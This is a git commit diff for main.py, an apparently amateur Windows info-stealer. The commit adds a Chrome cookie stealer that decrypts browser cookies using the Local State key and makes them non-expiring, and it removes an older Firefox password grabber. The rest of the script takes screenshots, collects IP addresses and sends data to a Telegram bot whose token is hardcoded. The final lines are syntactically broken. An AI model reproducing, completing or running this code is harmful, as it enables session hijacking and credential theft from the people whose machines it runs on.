cfb5d28fd6e6505b41d680f4582485d957312156
321 blinikidzhon <nbalaev231@gmail.com>
2023-03-06 23:48:00 +0100

    added google cookie stealer also little noes in code

--- main.py
+++ main.py
@@ -4,27 +4,105 @@ from requests import get
 from PIL import ImageGrab
 import os
 import random
+import json
+import base64
 import sqlite3
+import shutil
+from datetime import datetime, timedelta
+import win32crypt
+from Crypto.Cipher import AES
+import zipfile
 
 
 
-def Firefox_cookies():
-   texto = 'Passwords firefox:' + '\n'
-   texto += 'URL | LOGIN | PASSWORD' + '\n'
-   if os.path.exists(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox'):
-       shutil.copy2(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2', os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2')
-       conn = sqlite3.connect(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2')
-       cursor = conn.cursor()
-       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-       for result in cursor.fetchall():
-           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
-           login = result[1]
-           url = result[0]
-           if password != '':
-               texto += url + ' | ' + login + ' | ' + password + '\n'
-file = open(os.getenv("APPDATA") + '\\firefox_pass.txt', "w+")
-file.write(str(Firefox_cookies()) + '\n')
-file.close()
+def zip_dir(path, ziph):
+    # ziph is zipfile handle
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file))
+
+
+
+def get_chrome_datetime(chromedate):
+    """Return a `datetime.datetime` object from a chrome format datetime
+    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
+    if chromedate != 86400000000 and chromedate:
+        try:
+            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+        except Exception as e:
+            print(f"Error: {e}, chromedate: {chromedate}")
+            return chromedate
+    else:
+        return ""
+
+def get_encryption_key():
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+
+    key = key[5:]
+
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+def decrypt_data(data, key):
+    try:
+        iv = data[3:15]
+        data = data[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(data)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
+        except:
+
+            return ""
+
+def main():
+
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                            "Google", "Chrome", "User Data", "Default", "Network","Cookies")
+
+    filename = "Cookies.db"
+    if not os.path.isfile(filename):
+        shutil.copyfile(db_path, filename)
+
+    db = sqlite3.connect(filename)
+    cursor = db.cursor()
+    cursor.execute("""
+    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
+    FROM cookies""")
+
+    key = get_encryption_key()
+    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
+        if not value:
+            decrypted_value = decrypt_data(encrypted_value, key)
+        else:
+            decrypted_value = value
+        print(f"""
+        Host: {host_key}
+        Cookie name: {name}
+        Cookie value (decrypted): {decrypted_value}
+        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
+        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
+        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
+        ===============================================================
+        """)
+
+        cursor.execute("""
+        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
+        WHERE host_key = ?
+        AND name = ?""", (decrypted_value, host_key, name))
+
+    db.commit()
+
+    db.close()
+
 
 
 
@@ -39,11 +117,10 @@ print(f'lip: {local_ip}')
 print(f'pip: {public_ip}')
 
 
-randname = f"screen{hostname}-{str(random.randint(111111,999999))}"
+randname = f"{hostname}-{str(random.randint(111111,999999))}"
 screen = ImageGrab.grab()
-screen.save(os.getenv("APPDATA") + f'\\{randname}.jpg')
+screen.save(os.getcwd() + f'\\screen{randname}.jpg')
 
-Firefox_cookies()
 
 
 token = "5701589055:AAHL1gbfBrCO6PFf-wGoOJe9QdQRmUNIC-0"
@@ -53,3 +130,10 @@ url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" 
 results = requests.get(url_req)
 print(results.json())
 
+if __name__ == "__main__":
+    zipf = zipfile.ZipFile(f'{randname}.zip', 'w', zipfile.ZIP_DEFLATED)
+    zip_dir('C:\\Users\\User\\PycharmProjects\\pythonProject\\venv\\Scripts', zipf)
+    zipf.close()
+    with open("output.txt", "w") as f:
+        f.write(main())
+        .close()
